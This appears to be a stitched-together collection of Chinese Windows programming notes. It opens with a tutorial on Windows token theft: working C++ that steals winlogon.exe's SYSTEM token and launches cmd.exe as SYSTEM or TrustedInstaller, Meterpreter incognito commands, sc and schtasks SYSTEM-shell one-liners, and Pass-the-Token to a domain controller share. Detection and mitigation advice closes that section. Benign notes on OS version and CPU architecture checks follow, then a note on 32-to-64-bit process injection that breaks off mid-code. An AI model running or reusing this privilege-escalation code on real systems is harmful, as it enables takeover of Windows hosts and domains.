                  概述 



Windows Token 的窃取与利用、incognito 工具的使用、获取 System 和 TrustedInstaller 权限



相关推荐：

渗透技巧——Token窃取与利用

基本概念回顾
Token（访问令牌） 是 Windows 安全模型的核心。每个进程和线程都关联一个 Token，内核在访问对象时用它做权限检查。
两种主要类型：

Primary Token（主令牌）：进程级别，由 CreateProcess 系列函数继承或显式指定
Impersonation Token（模拟令牌）：线程级别，用于服务端模拟调用方身份

模拟令牌有四个等级（SECURITY_IMPERSONATION_LEVEL）：






























等级值说明Anonymous0无法获取调用方信息Identification1可查询身份，不能模拟Impersonation2本地模拟Delegation3跨网络模拟（需 Kerberos）
窃取 Token 的本质是：拿到目标进程/线程的 Token 句柄，再用它创建新进程或切换当前线程身份。

Token 窃取原理
所需权限
窃取 Token 依赖两个关键特权，通常需要管理员或 SYSTEM 权限才能开启：





















特权用途SeDebugPrivilege打开任意进程（OpenProcess 不受 DACL 限制）SeImpersonatePrivilege用窃取到的令牌模拟其他用户SeAssignPrimaryTokenPrivilege将令牌设置为进程主令牌

服务账户（Network Service、Local Service、IIS AppPool）默认具有 SeImpersonatePrivilege，这是 Potato 系列提权的前提。

核心 API 链
C++cppOpenProcess(PROCESS_QUERY_INFORMATION, pid)
  → OpenProcessToken(hProc, TOKEN_DUPLICATE, &amp;hToken)
    → DuplicateTokenEx(hToken, ..., TokenImpersonation/TokenPrimary, &amp;hDup)
      → ImpersonateLoggedOnUser(hDup)          // 切换当前线程
        or
      → CreateProcessWithTokenW(hDup, ...)     // 启动新进程

手动实现 Token 窃取
枚举进程并窃取指定用户的 Token
C++cpp#include &lt;windows.h&gt;
#include &lt;tlhelp32.h&gt;
#include &lt;stdio.h&gt;

// 开启指定特权
BOOL EnablePrivilege(LPCWSTR lpPrivilege) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))
        return FALSE;

    if (!LookupPrivilegeValueW(NULL, lpPrivilege, &amp;luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL ret = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return ret &amp;&amp; (GetLastError() == ERROR_SUCCESS);
}

// 从目标 PID 窃取 Token 并模拟
BOOL StealToken(DWORD dwPid) {
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid);
    if (!hProc) return FALSE;

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &amp;hToken)) {
        CloseHandle(hProc);
        return FALSE;
    }

    HANDLE hDupToken = NULL;
    // 复制为模拟令牌
    BOOL ok = DuplicateTokenEx(
        hToken,
        TOKEN_ALL_ACCESS,
        NULL,
        SecurityImpersonation,
        TokenImpersonation,
        &amp;hDupToken
    );

    CloseHandle(hToken);
    CloseHandle(hProc);
    if (!ok) return FALSE;

    // 切换当前线程身份
    ok = ImpersonateLoggedOnUser(hDupToken);
    CloseHandle(hDupToken);
    return ok;
}

int wmain() {
    EnablePrivilege(SE_DEBUG_NAME);
    EnablePrivilege(SE_IMPERSONATE_NAME);

    // 窃取 winlogon.exe (SYSTEM) 的 Token
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &amp;pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L&quot;winlogon.exe&quot;) == 0) {
                if (StealToken(pe.th32ProcessID)) {
                    wprintf(L&quot;[+] 模拟成功，PID=%lu\n&quot;, pe.th32ProcessID);
                    // 在此执行需要 SYSTEM 权限的操作...
                    system(&quot;whoami&quot;);  // 应输出 nt authority\system
                    RevertToSelf();   // 恢复原身份
                }
                break;
            }
        } while (Process32NextW(hSnap, &amp;pe));
    }
    CloseHandle(hSnap);
    return 0;
}
用窃取的 Token 启动新进程
ImpersonateLoggedOnUser 只影响当前线程；要 启动一个以目标身份运行的新进程，需要用主令牌：
C++cpp// 将复制类型改为 TokenPrimary
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
    SecurityImpersonation, TokenPrimary, &amp;hPrimaryToken);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = {};

// CreateProcessWithTokenW 要求调用方有 SeImpersonatePrivilege
CreateProcessWithTokenW(
    hPrimaryToken,
    LOGON_WITH_PROFILE,
    L&quot;C:\\Windows\\System32\\cmd.exe&quot;,
    NULL, 0, NULL, NULL, &amp;si, &amp;pi
);

注意：CreateProcessWithTokenW 内部经由 Secondary Logon 服务（seclogon），若该服务被禁用则调用失败。替代方案是 CreateProcessAsUserW（需要 SeAssignPrimaryTokenPrivilege）。


incognito 工具
incognito 是 Metasploit 中集成的 Token 操作模块，也有独立的 Windows 可执行版本。
Metasploit 中使用
bash# 获得 Meterpreter 会话后加载
meterpreter &gt; load incognito

# 列出所有可用令牌
meterpreter &gt; list_tokens -u

[*] Delegation Tokens Available
========================================
NT AUTHORITY\SYSTEM
WIN-TEST\Administrator

[*] Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK SERVICE

# 模拟 SYSTEM 令牌
meterpreter &gt; impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM

# 返回原始令牌
meterpreter &gt; rev2self
独立版本（Windows 命令行）
cmd# 列出令牌
incognito.exe list_tokens -u

# 执行命令（以目标身份）
incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe
Delegation vs Impersonation Token 的区别：

Delegation Token：从交互式登录（本地登录、RDP）产生，可用于跨网络资源访问（Pass-the-Token）
Impersonation Token：来自网络登录（net use、WMI），不可用于二次网络跳转


获取 SYSTEM 权限
从管理员（High Integrity）提升到 SYSTEM 有多条路径：
方法一：Token 窃取（推荐）
目标：winlogon.exe、lsass.exe、services.exe 等以 SYSTEM 运行的进程。
powershell# PowerShell 一行版（需管理员）
$id = (Get-Process winlogon)[0].Id
$h = [System.Diagnostics.Process]::GetProcessById($id).Handle
或者使用 PsExec（Sysinternals）：
cmdPsExec.exe -s -i cmd.exe
# -s  以 SYSTEM 运行
# -i  交互式（桌面可见）
方法二：创建系统服务
cmd# 注册一个以 LocalSystem 运行的服务
sc create SystemShell binPath= &quot;cmd.exe /c start cmd.exe&quot; type= own start= demand obj= &quot;LocalSystem&quot;
sc start SystemShell
sc delete SystemShell
方法三：通过计划任务
cmdschtasks /create /tn &quot;SystemShell&quot; /tr &quot;cmd.exe&quot; /sc once /st 00:00 /ru SYSTEM /f
schtasks /run /tn &quot;SystemShell&quot;
schtasks /delete /tn &quot;SystemShell&quot; /f

获取 TrustedInstaller 权限
TrustedInstaller 是 Windows 中权限高于 SYSTEM 的账户，用于保护系统文件（如 C:\Windows\System32 下的核心 DLL）。即使是 SYSTEM 账户也无法直接修改这些文件。
原理
TrustedInstaller 实际上是一个服务账户（SID: S-1-5-80-956008885-...），对应服务 TrustedInstaller（C:\Windows\servicing\TrustedInstaller.exe）。
获取该权限的步骤：

先提升到 SYSTEM
启动 TrustedInstaller 服务
窃取该服务进程的 Token

实现代码
C++cpp#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

DWORD GetTrustedInstallerPid() {
    // 启动服务，获取其 PID
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    SC_HANDLE hSvc = OpenServiceW(hSCM, L&quot;TrustedInstaller&quot;,
        SERVICE_START | SERVICE_QUERY_STATUS);

    SERVICE_STATUS_PROCESS ssp = {};
    DWORD dwBytes = 0;
    QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
        (LPBYTE)&amp;ssp, sizeof(ssp), &amp;dwBytes);

    if (ssp.dwCurrentState != SERVICE_RUNNING) {
        StartServiceW(hSvc, 0, NULL);
        // 等待服务启动
        Sleep(1000);
        QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
            (LPBYTE)&amp;ssp, sizeof(ssp), &amp;dwBytes);
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return ssp.dwProcessId;
}

int wmain() {
    // 1. 确保当前是 SYSTEM（先用 Token 窃取提权）
    EnablePrivilege(SE_DEBUG_NAME);

    // 2. 获取 TrustedInstaller PID
    DWORD dwTIPid = GetTrustedInstallerPid();
    wprintf(L&quot;[*] TrustedInstaller PID: %lu\n&quot;, dwTIPid);

    // 3. 窃取 Token
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwTIPid);
    HANDLE hToken = NULL;
    OpenProcessToken(hProc, TOKEN_DUPLICATE, &amp;hToken);

    HANDLE hPrimary = NULL;
    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
        SecurityImpersonation, TokenPrimary, &amp;hPrimary);

    // 4. 以 TrustedInstaller 身份启动进程
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    CreateProcessWithTokenW(hPrimary, LOGON_WITH_PROFILE,
        L&quot;C:\\Windows\\System32\\cmd.exe&quot;,
        NULL, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);

    wprintf(L&quot;[+] TrustedInstaller CMD 已启动\n&quot;);
    return 0;
}
工具化方案
NSudo 封装了上述逻辑，直接 GUI 操作：
cmd# 命令行方式
NSudoLC.exe -U:T -P:E cmd.exe
# -U:T  TrustedInstaller 权限
# -P:E  开启所有可用特权

Pass-the-Token（令牌传递）
与 Pass-the-Hash 类似，Delegation Token 包含完整的 Kerberos 票据，可用于访问网络资源。
bash# 在 Meterpreter + incognito 中
meterpreter &gt; list_tokens -u
# 找到域用户的 Delegation Token

meterpreter &gt; impersonate_token &quot;DOMAIN\\DomainAdmin&quot;
# 现在可以访问域内资源
meterpreter &gt; shell
cmd&gt; dir \\DC01\C$

防御与检测
关键事件 ID





























事件 ID含义4624登录成功（关注 Logon Type 9 - NewCredentials）4648使用显式凭据的登录尝试4672分配了特殊特权（SeDebug、SeImpersonate 等）4688进程创建（关注父子关系异常）4703Token 权限调整
防护措施

最小权限原则：服务账户不分配不必要的特权，尤其是 SeDebugPrivilege
Protected Process Light (PPL)：lsass.exe 开启 PPL 后无法被普通 SYSTEM 进程打开
Windows Defender Credential Guard：保护域凭据，阻断 Token 中的票据滥用
审计特权使用：开启「审核特权使用」策略，监控 4672/4703 事件
禁用 Secondary Logon 服务：阻断 CreateProcessWithTokenW 的一条调用路径（影响 runas 等功能）


参考

渗透技巧——Token窃取与利用
incognito - FSecureLABS
NSudo
Microsoft Docs - Access Tokens
Microsoft Docs - Privilege Constants

a_os/windows/查询系统信息/判断windows版本.content:
[toc]
接口说明
在windows操作系统上，判断系统版本号一般都是使用 GetVersionEx 函数，但是该函数 windows8.1 以后被启用了，尽管可以通过添加宏来忽略 4996 的错误。在新的API中提供了新的接口以供判断操作系统版本：

Versionhelpers.h 标头 - Win32 apps | Microsoft Learn
声明的宏

本文介绍如何使用 IsWindowsVersionOrGreater  和 verifyVersionInfoW 函数。
关于如何查询windows版本号可以看这个文档： 更新 WINVER 和 _WIN32_WINNT | Microsoft Learn
Windows各个版本的宏





























































































所需的最低系统NTDDI_VERSION的值Windows 10 1903 “19H1”NTDDI_WIN10_19H1 (0x0A000007)Windows 10 1809 “红石 5”NTDDI_WIN10_RS5 (0x0A000006)Windows 10 1803 “红石 4”NTDDI_WIN10_RS4 (0x0A000005)Windows 10 1709 “红石 3”NTDDI_WIN10_RS3 (0x0A000004)Windows 10 1703 “红石 2”NTDDI_WIN10_RS2 (0x0A000003)Windows 10 1607 “红石 1”NTDDI_WIN10_RS1 (0x0A000002)Windows 10 1511“阈值 2”NTDDI_WIN10_TH2 (0x0A000001)Windows 10 1507“阈值”NTDDI_WIN10 (0x0A000000)Windows 8.1NTDDI_WINBLUE (0x06030000)Windows 8NTDDI_WIN8 (0x06020000)Windows 7NTDDI_WIN7 (0x06010000)Windows Server 2008NTDDI_WS08 (0x06000100)Windows Vista Service Pack 1 (SP1)NTDDI_VISTASP1 (0x06000100)Windows VistaNTDDI_VISTA (0x06000000)Windows Server 2003 Service Pack 2 (SP2)NTDDI_WS03SP2 (0x05020200)带有 Service Pack 1 (SP1) 的 Windows Server 2003NTDDI_WS03SP1 (0x05020100)Windows Server 2003NTDDI_WS03 (0x05020000)Windows XP Service Pack 3 (SP3)NTDDI_WINXPSP3 (0x05010300)Windows XP Service Pack 2 (SP2)NTDDI_WINXPSP2 (0x05010200)Windows XP Service Pack 1 (SP1)NTDDI_WINXPSP1 (0x05010100)Windows XPNTDDI_WINXP (0x05010000)
补充
关于 函数的三个参数的输入可以参考文档中定义的宏：
C++cpp#define OSVER(Version)  ((Version) &amp; OSVERSION_MASK)
#define SPVER(Version)  (((Version) &amp; SPVERSION_MASK) &gt;&gt; 8)
#define SUBVER(Version) (((Version) &amp; SUBVERSION_MASK) )
除此之外，还可以使用以下宏获取三个版本号：
C++cpp/*
LOWORD()得到一个32bit数的低16bit  
HIWORD()得到一个32bit数的高16bit
LOBYTE()得到一个16bit数最低（最右边）那个字节
HIBYTE()得到一个16bit数最高（最左边）那个字节
*/

#define LOWORD(l)           ((WORD)(((DWORD_PTR)(l)) &amp; 0xffff))
#define HIWORD(l)           ((WORD)((((DWORD_PTR)(l)) &gt;&gt; 16) &amp; 0xffff))
#define LOBYTE(w)           ((BYTE)(((DWORD_PTR)(w)) &amp; 0xff))
#define HIBYTE(w)           ((BYTE)((((DWORD_PTR)(w)) &gt;&gt; 8) &amp; 0xff))
示例
IsWindowsVersionOrGreater 函数是 Windows API 中的一个函数，用于检查当前运行的操作系统版本是否满足指定的条件。以下是该函数的一些常见用法：


检查特定版本及以上的 Windows 版本：


C++cpp#include &lt;Windows.h&gt;

// 示例：检查 Windows 7 及以上版本
if (IsWindowsVersionOrGreater(6, 1, 0))
{
    // 在 Windows 7 或更高版本上执行某些操作
}


检查特定版本和 Service Pack 的 Windows 版本：


C++cpp#include &lt;Windows.h&gt;

// 示例：检查 Windows 10 版本 1809（秋季创意者更新）及以上版本
if (IsWindowsVersionOrGreater(10, 0, 17763))
{
    // 在 Windows 10 版本 1809（秋季创意者更新）或更高版本上执行某些操作
}


检查是否为特定 Windows Server 版本：


C++cpp#include &lt;Windows.h&gt;

// 示例：检查是否为 Windows Server 2016 版本
if (IsWindowsVersionOrGreater(HIBYTE(_WIN32_WINNT_WIN10), LOBYTE(_WIN32_WINNT_WIN10), 0))
{
    // 在 Windows Server 2016 或更高版本上执行某些操作
}


检查特定版本、Service Pack 和产品类型的 Windows 版本：


C++cpp#include &lt;Windows.h&gt;

// 示例：检查 Windows 8.1 Update 版本且为工作站类型
if (IsWindowsVersionOrGreater(6, 3, 0, VER_GREATER_EQUAL, VER_NT_WORKSTATION))
{
    // 在 Windows 8.1 Update 版本且为工作站类型上执行某些操作
}
这些示例可以帮助你理解 IsWindowsVersionOrGreater 函数的各种用法，你可以根据实际需求在代码中适当调整参数和条件。
请注意，IsWindowsVersionOrGreater 是一个动态链接库函数，在使用时需要包含 &lt;Windows.h&gt; 头文件，且需要链接到 Version.lib 库。
判断 dwPlatformId
dwPlatformId 字段说明
在 Windows 系统中，常用的平台标识（Platform ID）定义如下：

VER_PLATFORM_WIN32s：表示 Win32s 子系统，它是为 Windows 3.1 提供的一个扩展运行环境，使得部分 32 位应用程序可以在 Windows 3.1 上运行。
VER_PLATFORM_WIN32_WINDOWS：表示 Windows 9x 系列操作系统，包括 Windows 95、Windows 98 和 Windows ME。这些操作系统都是基于 MS-DOS 的。
VER_PLATFORM_WIN32_NT：表示 Windows NT 系列操作系统，包括 Windows NT、Windows 2000、Windows XP、Windows Server 2003、Windows Vista、Windows 7、Windows 8、Windows 10 等版本。这些操作系统是基于全新的内核设计的，并具有更强大的功能和稳定性。

每个平台标识对应不同的操作系统系列，因此在开发应用程序时，根据需要选择正确的平台标识是很重要的。
判断
C++cppbool IsWindowsNT()
{
	OSVERSIONINFOEX osvi;
	ZeroMemory(&amp;osvi, sizeof(OSVERSIONINFOEX));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	// osvi.dwPlatformId = VER_PLATFORM_WIN32s;
	// osvi.dwPlatformId = VER_PLATFORM_WIN32_WINDOWS;
	osvi.dwPlatformId = VER_PLATFORM_WIN32_NT;

	DWORDLONG conditionMask = 0;
	VER_SET_CONDITION(conditionMask, VER_PLATFORMID, VER_EQUAL);

	return  VerifyVersionInfo(&amp;osvi, VER_PLATFORMID, conditionMask);
}

a_os/windows/查询系统信息/查询处理器架构.content:

                  概述 



问题： 在 arm 架构的 windows 上使用 GetSystemInfo 获取到的 wProcessorArchitecture 参数不准确。




由于 arm 架构的 windows 操作系统非常少见，所以客户端上线时并没有回归过检测 arm 操作系统。导致上线后出现驱动安装失败问题。

[toc]
使用 GetSystemInfo 查询
C++cppstd::string GetNcProcessorArchitecture()
	{
		SYSTEM_INFO si = { 0 };
		GetSystemInfo(&amp;si);
		DWORD architecture = si.wProcessorArchitecture;
#if 0
#define PROCESSOR_ARCHITECTURE_INTEL 0 
#define PROCESSOR_ARCHITECTURE_MIPS 1  
#define PROCESSOR_ARCHITECTURE_ALPHA 2
#define PROCESSOR_ARCHITECTURE_PPC 3
#define PROCESSOR_ARCHITECTURE_SHX 4 
#define PROCESSOR_ARCHITECTURE_ARM 5  
#define PROCESSOR_ARCHITECTURE_IA64 6 
#define PROCESSOR_ARCHITECTURE_ALPHA64 7  
#define PROCESSOR_ARCHITECTURE_MSIL 8  
#define PROCESSOR_ARCHITECTURE_AMD64 9
#define PROCESSOR_ARCHITECTURE_ARM64 12
#endif

		if (architecture == PROCESSOR_ARCHITECTURE_AMD64)
		{
			return &quot;amd64&quot;;
		}
		else if (architecture == PROCESSOR_ARCHITECTURE_INTEL)
		{
			return &quot;i386&quot;;
		}
		else if (architecture == PROCESSOR_ARCHITECTURE_ARM64 || architecture == PROCESSOR_ARCHITECTURE_ARM)
		{
			return &quot;arm&quot;;
		}

		return &quot;&quot;;
	}
使用 GetSystemInfo 查询的 wProcessorArchitecture 的值为 0。
查询注册表
调研一番后，发现使用注册表的方式更稳妥一点。
C++cpp#include &lt;iostream&gt;
#include &lt;Windows.h&gt;

int main() {
    HKEY hKey;
    TCHAR processorArchitecture[255];
    DWORD bufferSize = sizeof(processorArchitecture);

    // 打开注册表键
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(&quot;SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment&quot;), 0, KEY_READ, &amp;hKey) == ERROR_SUCCESS) {
        // 读取注册表值
        if (RegQueryValueEx(hKey, TEXT(&quot;PROCESSOR_ARCHITECTURE&quot;), nullptr, nullptr, reinterpret_cast&lt;LPBYTE&gt;(processorArchitecture), &amp;bufferSize) == ERROR_SUCCESS) {
            std::cout &lt;&lt; &quot;Processor Architecture: &quot; &lt;&lt; processorArchitecture;
        }

        // 关闭注册表键
        RegCloseKey(hKey);
    }

    return 0;
}

a_os/windows/注入与hook/32位程序对64位程序的注入.content:
概述：【学习记录】实现 32 位程序对 64位程序的注入，借鉴 3gstudent 和 odzhan 的实现。


环境说明：

Windows
x64 被注入程序
x86 dll

0x01、前言
通常要实现远程注入都需要调用 CreateRemoteThread 函数在目标进程中创建一个远程线程，进而注入dll或是执行shellcode。如下所示为注入一个简单的dll到notepad中。
注入的常规流程为：

本地提权
获取目标进程的pid
打开目标进程
在目标进程申请内存并写入内存
通过公共函数调用创建远程线程

参考代码见文章 dll注入
但是，在64位操作系统上，由于32位和64位的结构不同，所以会导致注入失败。
0x02、实现思路
主要思路为：将 CreateRemoteThread 切换为64位的 CreateRemoteThread 后再创建线程，完成后再切换回32位，即可实现32位程序对64位进程的远程注入。切换的操作主要是汇编代码实现的（获取 64 位下 CreateRemoteThread 的汇编代码，然后在 32 位程序中调用），记录一下。
1 获取64位 CreateRemoteThread 函数地址
获取64位 CreateRemoteThread 主要由汇编代码实现。
参考博客：DLL/PIC Injection on Windows from Wow64 process | modexp
相关代码 shellcode/os/win/pi at master · odzhan/shellcode
2 注入线程并调用
参考代码： CreateRemoteThread简单应用-CSDN博客
主要逻辑为：

获取目标进程PID
需要判断系统操作数
需要判断目标进程的操作数
申请内存
获取 CreateRemoteThread 函数的地址
创建远程线程


3 判断系统操作数
C++cpp#include &lt;windows.h&gt;
BOOL Is64BitOS()
{
    typedef VOID (WINAPI *LPFN_GetNativeSystemInfo)( __out LPSYSTEM_INFO lpSystemInfo );
    LPFN_GetNativeSystemInfo fnGetNativeSystemInfo = (LPFN_GetNativeSystemInfo)GetProcAddress( GetModuleHandle(&quot;kernel32&quot;),&quot;GetNativeSystemInfo&quot;);
    if(fnGetNativeSystemInfo)
    {
        SYSTEM_INFO stInfo = {0};
        fnGetNativeSystemInfo( &amp;stInfo);
        if( stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64
            || stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
        {
            return TRUE;
        }
    }
    return FALSE;
}
int main()
{
    if (Is64BitOS())   
        printf(&quot;x64\n&quot;);
    else
        printf(&quot;x86\n&quot;);
    return 0;
}
4 判断目标进程是不是 64 位
C++cpp#include &lt;windows.h&gt;
#include &lt;TlHelp32.h&gt;  

BOOL IsWow64(HANDLE hProcess)
{
    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process;

    BOOL bIsWow64 = FALSE;
    fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
    GetModuleHandle(&quot;kernel32&quot;),&quot;IsWow64Process&quot;);

    if (NULL != fnIsWow64Process)
    {
        fnIsWow64Process(hProcess, &amp;bIsWow64);  
    }
    return bIsWow64;
}

DWORD processNameToId(LPCTSTR lpszProcessName)  
{  
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  
    PROCESSENTRY32 pe;  
    pe.dwSize = sizeof(PROCESSENTRY32);  
    if (!Process32First(hSnapshot, &amp;pe)) {  
        MessageBox(NULL,   
            &quot;The frist entry of the process list has not been copyied to the buffer&quot;,&quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);  
        return 0;  
    }  
    while (Process32Next(hSnapshot, &amp;pe)) {  
        if (!strcmp(lpszProcessName, pe.szExeFile)) {  
